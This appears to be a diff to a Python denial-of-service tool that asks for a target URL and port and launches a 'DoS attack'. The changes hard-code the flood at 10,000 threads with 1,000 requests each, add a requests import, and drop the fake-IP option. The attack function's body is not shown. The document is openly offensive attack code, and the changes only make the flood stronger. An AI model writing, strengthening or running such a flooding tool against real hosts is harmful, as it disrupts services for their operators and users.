@@ -4,6 +4,7 @@ import threading
 import pyfiglet
 from colorama import init, Fore, Style
 import time
+import requests
 
 # Initialize colorama
 init()
@@ -103,9 +104,8 @@ if __name__ == "__main__":
     target_url = input(f"{Fore.CYAN}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}")
     target_ip = socket.gethostbyname(target_url.split('//')[1].split('/')[0])
     target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
-    num_threads = int(input(f"{Fore.CYAN}Enter number of threads: {Style.RESET_ALL}"))
-    num_requests_per_thread = int(input(f"{Fore.CYAN}Enter number of requests per thread: {Style.RESET_ALL}"))
-    use_fake_ips = input(f"{Fore.CYAN}Use fake IPs for attack? (y/n): {Style.RESET_ALL}").lower() == 'y'
+    num_threads = 10000  # Increase number of threads
+    num_requests_per_thread = 1000  # Increase number of requests per thread
 
     print(f"{Fore.YELLOW}Launching DoS attack on {target_ip}:{target_port} with {num_threads} threads and {num_requests_per_thread} requests per thread...{Style.RESET_ALL}")
-    launch_dos_attack(target_ip, target_port, num_threads, num_requests_per_thread, use_fake_ips)
+    launch_dos_attack(target_ip, target_port, num_threads, num_requests_per_thread)
